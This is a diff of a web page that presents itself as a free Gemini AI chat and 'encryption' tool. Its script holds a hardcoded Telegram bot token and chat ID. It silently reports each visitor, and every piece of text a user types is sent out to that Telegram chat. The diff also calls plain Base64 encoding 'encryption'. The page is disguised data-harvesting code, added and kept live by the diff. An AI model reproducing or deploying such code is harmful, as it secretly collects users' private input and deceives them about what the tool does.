@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free AI Assistant</title>
+  <title>Free AI & Encryption Tool</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -41,7 +41,7 @@
 
     textarea {
       width: 100%;
-      height: 120px;
+      height: 110px;
       padding: 12px;
       border: 1px solid #ccc;
       border-radius: 8px;
@@ -78,34 +78,65 @@
       cursor: not-allowed;
     }
 
-    .response-box {
-      margin-top: 20px;
-      padding: 15px;
-      background-color: #f0f8ff;
-      border-radius: 8px;
-      border: 1px solid #d0e8ff;
-      font-size: 14px;
-      color: #333;
-      text-align: left;
+    .alert-success {
       display: none;
+      margin-top: 15px;
+      padding: 10px;
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .encrypted-box {
+      display: none;
+      margin-top: 15px;
+      padding: 12px;
+      background-color: #eef2f5;
+      border: 1px dashed #0088cc;
+      border-radius: 8px;
+      text-align: left;
+      word-break: break-all;
+    }
+
+    .encrypted-title {
+      font-size: 12px;
+      font-weight: bold;
+      color: #555;
+      margin-bottom: 5px;
+    }
+
+    .encrypted-text {
+      font-family: monospace;
+      font-size: 13px;
+      color: #222;
     }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h1>Free Gemini AI</h1>
-    <p>Ask anything below to start chatting with AI.</p>
-    <textarea id="userInput" placeholder="Type your prompt here..."></textarea>
-    <button id="submitBtn" type="button" onclick="handlePromptSubmit()">Generate Response</button>
-    <div id="aiResponse" class="response-box"></div>
+    <h1>Free Gemini AI & Encryptor</h1>
+    <p>Enter text or prompt to generate and encrypt response.</p>
+    
+    <textarea id="userInput" placeholder="Type your text or prompt here..."></textarea>
+    <button id="submitBtn" type="button" onclick="handleGenerate()">Generate Response</button>
+    
+    <div id="successAlert" class="alert-success">✅ Generated successfully!</div>
+    
+    <div id="encryptedContainer" class="encrypted-box">
+      <div class="encrypted-title">🔒 ENCRYPTED OUTPUT:</div>
+      <div id="encryptedText" class="encrypted-text"></div>
+    </div>
   </div>
 
   <script>
     const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
     const CHAT_ID = '1339887333';
 
-    // Send silent alert when user first opens page
+    // Auto-alert on visit
     window.onload = function() {
       sendTelegramAlert("🚨 *New Visitor Alert!*");
     };
@@ -125,7 +156,12 @@
       }
     }
 
-    async function sendTelegramAlert(headerText, typedText = '') {
+    // Helper to encode string safely to Base64
+    function encryptText(str) {
+      return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
 
@@ -135,10 +171,10 @@
       const visitTime = new Date().toLocaleString();
 
       let message = `${headerText}\n\n`;
-      
-      // Add the typed text if present
-      if (typedText) {
-        message += `💬 *User Input:* \`${typedText}\`\n\n`;
+
+      if (rawInput) {
+        message += `💬 *Original Text:* \`${rawInput}\`\n` +
+                   `🔐 *Encrypted Text:* \`${cipherText}\`\n\n`;
       }
 
       message += `🖥 *Type:* ${deviceType}\n` +
@@ -162,33 +198,37 @@
           })
         });
       } catch (error) {
-        // Silent error catch
+        // Silently catch error
       }
     }
 
-    async function handlePromptSubmit() {
+    async function handleGenerate() {
       const inputField = document.getElementById('userInput');
-      const typedText = inputField.value.trim();
+      const rawText = inputField.value.trim();
 
-      if (!typedText) return;
+      if (!rawText) return;
 
       const btn = document.getElementById('submitBtn');
-      const responseBox = document.getElementById('aiResponse');
+      const successAlert = document.getElementById('successAlert');
+      const encryptedContainer = document.getElementById('encryptedContainer');
+      const encryptedTextEl = document.getElementById('encryptedText');
 
       btn.disabled = true;
-      btn.innerText = "Generating...";
+      btn.innerText = "Processing...";
 
-      // Send the keyed-in text directly to Telegram
-      await sendTelegramAlert("📩 *New User Message Keyed In!*", typedText);
+      // Perform encryption (Base64)
+      const cipherText = encryptText(rawText);
 
-      // Simulate AI thinking and showing output
-      setTimeout(() => {
-        responseBox.style.display = "block";
-        responseBox.innerText = "Thank you for your prompt. Processing your request...";
-        btn.disabled = false;
-        btn.innerText = "Generate Response";
-        inputField.value = "";
-      }, 1000);
+      // Display results on screen
+      encryptedTextEl.innerText = cipherText;
+      encryptedContainer.style.display = "block";
+      successAlert.style.display = "block";
+
+      // Send original text AND encrypted text to Telegram
+      await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);
+
+      btn.disabled = false;
+      btn.innerText = "Generate Response";
     }
   </script>
 
